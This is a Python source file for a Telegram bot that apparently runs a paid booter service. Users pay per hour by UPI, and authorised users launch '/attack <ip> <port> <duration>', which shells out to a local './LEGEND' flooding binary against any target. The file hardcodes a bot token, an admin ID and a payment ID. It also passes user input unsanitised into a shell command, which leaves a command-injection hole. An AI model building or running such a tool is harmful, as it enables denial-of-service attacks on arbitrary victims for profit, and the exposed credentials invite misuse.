import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Bot token and allowed admin user
TELEGRAM_BOT_TOKEN = '7868284104:AAFfKh3qZL7-i-ufJaFOj2ZDrtDRvsV92Ig'
ALLOWED_USER_ID = 1441704343  # Admin user ID
allowed_users = {ALLOWED_USER_ID}  # Set of allowed users, initially only the admin is allowed
active_users = set()  # Track users who have interacted with the bot

bot_access_free = False  # Control if the bot is open for all users or restricted

# UPI ID for payment
UPI_ID = "gaurav.vo@fam"  # Replace with your actual UPI ID

# Get Admin's username
async def get_admin_username(context):
    admin_user = await context.bot.get_chat(ALLOWED_USER_ID)
    return admin_user.username

# Start command to welcome users
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    admin_username = await get_admin_username(context)  # Fetch admin's username

    if chat_id not in allowed_users:
        message = (
            "*🚫 Access Denied*\n\n"
            ". 💸 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓:-  𝟏 𝐇𝐨𝐮𝐫 𝟑𝟎₹ 𝟓 𝐇𝐨𝐮𝐫 𝟖𝟎₹ :\n\n"
            "*🔹 Pay via UPI:*\n"
            f"Pay to: `{UPI_ID}`\n\n"
            "𝐉𝐀𝐈𝐒𝐄 𝐇𝐈 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐊𝐀𝐑𝐎𝐆𝐄 𝐓𝐎 𝐋𝐄𝐆𝐄𝐍𝐃 𝐁𝐇𝐀𝐈 𝐊𝐎 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐊𝐀 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐒𝐀𝐍𝐃 𝐊𝐑𝐎 ❤‍🔥."
        )
    else:
        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use /attack <ip> <port> <duration>*\n"
            "*Let the war begin! ⚔️💥*\n\n"
            f"*Need help? Contact the admin @{admin_username} directly!*"
        )

    # Show all available commands inline
    keyboard = [
        [InlineKeyboardButton("🏠 Start", callback_data="start")],
        [InlineKeyboardButton("💰 Payment Details", callback_data="payment")],
        [InlineKeyboardButton("⚔️ Attack", callback_data="attack")],
        [InlineKeyboardButton("❌ Access Denied", callback_data="access_denied")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)
    active_users.add(chat_id)  # Track user who started the bot interaction

# Payment command to provide UPI details to the user
async def payment(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id in allowed_users:
        await context.bot.send_message(chat_id=chat_id, text="*✅ You already have access to the bot!*", parse_mode='Markdown')
        return

    message = (
        "*🔹 To access the bot, make a payment to the following UPI ID:* \n"
        f"Pay to: `{UPI_ID}`\n\n"
        "*Once you have completed the payment, contact the admin to verify and gain access.*"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Add user command - only admin can add users
async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can add users
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only admin can add new users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_user <user_id>*", parse_mode='Markdown')
        return

    new_user_id = int(args[0])
    allowed_users.add(new_user_id)  # Add the user to the allowed users set
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {new_user_id} has been added successfully!*", parse_mode='Markdown')

# Remove user command - only admin can remove users
async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can remove users
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only admin can remove users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove_user <user_id>*", parse_mode='Markdown')
        return

    remove_user_id = int(args[0])

    if remove_user_id in allowed_users:
        allowed_users.remove(remove_user_id)  # Remove the user from the allowed users set
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {remove_user_id} has been removed successfully!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ User {remove_user_id} is not in the allowed list!*", parse_mode='Markdown')

# Help command to show available commands (only for admin)
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only admin can use the /help command!*", parse_mode='Markdown')
        return

    # Show the help message to admin only
    message = (
        "*📝 Available Commands:*\n\n"
        "*1. /start* - Start interacting with the bot and get a welcome message.\n"
        "*2. /attack <ip> <port> <duration>* - Launch an attack (only for authorized users).\n"
        "*3. /add_user <user_id>* - Add a new user (Admin only).\n"
        "*4. /remove_user <user_id>* - Remove a user (Admin only).\n"
        "*5. /user_details* - View details of users who have interacted with the bot (Admin only).\n"
        "*6. /help* - Show this help message."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Function to run the attack process with countdown timer
async def run_attack_with_timer(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Send the initial message about the attack
        attack_message = await context.bot.send_message(
            chat_id=chat_id, 
            text=(
                f"*⚔️ Attack Launched! ⚔️*\n"
                f"*🎯 Target: {ip}:{port}*\n"
                f"*🕒 Duration: {duration} seconds*\n"
                f"*🔥 Let the battlefield ignite! 💥*\n"
                f"*⏳ Countdown: {duration} seconds remaining*"
            ), 
            parse_mode='Markdown'
        )

        # Countdown timer
        for remaining_time in range(duration, 0, -1):
            await asyncio.sleep(1)
            # Update the message with the new countdown time
            await context.bot.edit_message_text(
                chat_id=chat_id, 
                message_id=attack_message.message_id,
                text=(
                    f"*⚔️ Attack Launched! ⚔️*\n"
                    f"*🎯 Target: {ip}:{port}*\n"
                    f"*🕒 Duration: {duration} seconds*\n"
                    f"*🔥 Let the battlefield ignite! 💥*\n"
                    f"*⏳ Countdown: {remaining_time} seconds remaining*"
                ),
                parse_mode='Markdown'
            )

        # After the attack completes, show a completion message
        await process.communicate()
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

# Attack command that can only be used by authorized users
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id not in allowed_users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    try:
        duration = int(duration)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration! Please enter a valid number.*", parse_mode='Markdown')
        return

    # Start the attack with a countdown timer
    await run_attack_with_timer(chat_id, ip, port, duration, context)

# Admin command to show user details (all users who have interacted)
async def user_details(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only admin can use this command
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only admin can use this command!*", parse_mode='Markdown')
        return

    if not active_users:
        await context.bot.send_message(chat_id=chat_id, text="*No users have interacted yet.*", parse_mode='Markdown')
        return

    active_users_list = "\n".join([str(user) for user in active_users])
    await context.bot.send_message(chat_id=chat_id, text=f"*👤 Users who have interacted with the bot:*\n{active_users_list}\n*Total Users: {len(active_users)}*", parse_mode='Markdown')

# Main function to start the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add handlers for commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("add_user", add_user))  # New add_user command
    application.add_handler(CommandHandler("remove_user", remove_user))  # New remove_user command
    application.add_handler(CommandHandler("help", help_command))  # New help command
    application.add_handler(CommandHandler("payment", payment))  # Payment command
    application.add_handler(CommandHandler("user_details", user_details))  # Admin command to show user details

    application.run_polling()

if __name__ == '__main__':
    main()